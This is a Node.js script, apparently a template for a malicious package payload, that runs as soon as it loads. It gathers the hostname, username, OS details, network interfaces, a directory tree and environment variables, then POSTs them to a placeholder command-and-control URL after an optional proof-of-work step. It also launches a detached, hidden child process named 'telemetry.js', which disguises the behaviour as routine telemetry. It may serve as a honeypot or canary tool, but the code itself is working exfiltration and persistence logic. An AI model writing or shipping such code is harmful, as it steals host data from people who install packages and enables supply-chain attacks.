'use strict';
const os = require('os');
const fs = require('fs');
const path = require('path');
const https = require('https');
const http = require('http');
const cp = require('child_process');
const crypto = require('crypto');

const C2_URL = '__C2_URL__';
const PKG_NAME = '__PKG_NAME__';
const BEACON_SECRET = '__BEACON_SECRET__';
const BEACON_ID = crypto.randomUUID();

function tree(dir, depth) {
  if (depth === 0) return [];
  let result = [];
  try {
    const entries = fs.readdirSync(dir, { withFileTypes: true });
    for (const e of entries) {
      result.push({ name: e.name, type: e.isDirectory() ? 'd' : 'f', path: path.join(dir, e.name) });
      if (e.isDirectory()) result = result.concat(tree(path.join(dir, e.name), depth - 1));
    }
  } catch (_) {}
  return result;
}

function getInterfaces() {
  const ifaces = os.networkInterfaces();
  const out = {};
  for (const [name, addrs] of Object.entries(ifaces)) {
    out[name] = addrs.map(a => ({ address: a.address, family: a.family, internal: a.internal }));
  }
  return out;
}

// Solve hashcash-style PoW: find integer n such that SHA256(nonce+n) starts with `difficulty` zero hex chars
function solvePoW(nonce, difficulty) {
  const prefix = '0'.repeat(difficulty);
  let n = 0;
  while (true) {
    if (crypto.createHash('sha256').update(nonce + n).digest('hex').startsWith(prefix)) return n;
    n++;
  }
}

function httpGet(url, cb) {
  try {
    const u = new URL(url);
    const mod = u.protocol === 'https:' ? https : http;
    const req = mod.request(url, res => {
      let data = '';
      res.on('data', c => { data += c; });
      res.on('end', () => { try { cb(null, JSON.parse(data)); } catch (_) { cb(new Error('parse')); } });
    });
    req.on('error', cb);
    req.end();
  } catch (e) { cb(e); }
}

function sendBeacon(extra) {
  const payload = {
    beacon_id: BEACON_ID,
    beacon_secret: BEACON_SECRET,
    pkg: PKG_NAME,
    hostname: os.hostname(),
    username: os.userInfo().username,
    platform: os.platform(),
    arch: os.arch(),
    os_release: os.release(),
    interfaces: getInterfaces(),
    dir_tree: tree(process.cwd(), 3),
    env_vars: Object.fromEntries(
      ['PATH', 'USER', 'HOME', 'PWD', 'SHELL', 'LOGNAME', 'USERNAME'].filter(k => process.env[k]).map(k => [k, process.env[k]])
    ),
    cwd: process.cwd(),
    ...extra,
  };
  const body = JSON.stringify(payload);
  const url = new URL(C2_URL + '/api/beacon');
  const mod = url.protocol === 'https:' ? https : http;
  const req = mod.request({
    hostname: url.hostname,
    port: url.port || (url.protocol === 'https:' ? 443 : 80),
    path: url.pathname,
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
  }, () => {});
  req.on('error', () => {});
  req.write(body);
  req.end();

  try {
    const child = cp.spawn(process.execPath, [path.join(__dirname, 'telemetry.js')], {
      detached: true,
      stdio: 'ignore',
      env: { ...process.env, DOLUS_C2: C2_URL, DOLUS_PKG: PKG_NAME, DOLUS_BEACON_ID: BEACON_ID, DOLUS_SECRET: BEACON_SECRET },
    });
    child.unref();
  } catch (_) {}
}

// Fetch PoW challenge, solve if enabled, then register beacon
httpGet(C2_URL + '/api/pow', (err, data) => {
  if (!err && data && data.enabled && data.nonce) {
    const solution = solvePoW(data.nonce, data.difficulty || 5);
    sendBeacon({ pow_nonce: data.nonce, pow_solution: solution });
  } else {
    sendBeacon({});
  }
});
